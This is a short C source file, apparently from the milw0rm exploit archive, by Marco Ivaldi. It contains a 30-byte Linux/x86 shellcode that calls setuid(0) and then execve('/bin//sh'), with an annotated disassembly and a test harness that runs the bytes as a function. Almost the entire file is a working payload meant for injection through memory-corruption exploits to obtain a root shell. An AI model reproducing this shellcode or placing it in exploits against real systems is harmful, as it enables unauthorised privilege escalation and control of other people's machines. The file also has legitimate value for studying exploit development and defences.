/*
 * $Id: setuid-linux.c,v 1.4 2004/06/02 12:22:30 raptor Exp $
 *
 * setuid-linux.c - setuid/execve shellcode for Linux/x86
 * Copyright (c) 2004 Marco Ivaldi <raptor@0xdeadbeef.info>
 *
 * Short fully-functional setuid(0) and /bin/sh execve() shellcode.
 */

/*
 * setuid(0)
 *
 * 8049380:       6a 17                   push   $0x17
 * 8049382:       58                      pop    %eax
 * 8049383:       31 db                   xor    %ebx,%ebx
 * 8049385:       cd 80                   int    $0x80
 *
 * execve("/bin//sh", ["/bin//sh"], NULL)
 *
 * 8049387:       6a 0b                   push   $0xb
 * 8049389:       58                      pop    %eax
 * 804938a:       99                      cltd
 * 804938b:       52                      push   %edx
 * 804938c:       68 2f 2f 73 68          push   $0x68732f2f
 * 8049391:       68 2f 62 69 6e          push   $0x6e69622f
 * 8049396:       89 e3                   mov    %esp,%ebx
 * 8049398:       52                      push   %edx
 * 8049399:       53                      push   %ebx
 * 804939a:       89 e1                   mov    %esp,%ecx
 * 804939c:       cd 80                   int    $0x80
 */

char sc[] = /* 7 + 23 = 30 bytes */
"\x6a\x17\x58\x31\xdb\xcd\x80"
"\x6a\x0b\x58\x99\x52\x68//sh\x68/bin\x89\xe3\x52\x53\x89\xe1\xcd\x80";

main()
{
	int (*f)() = (int (*)())sc; f();
}

// milw0rm.com [2006-07-20]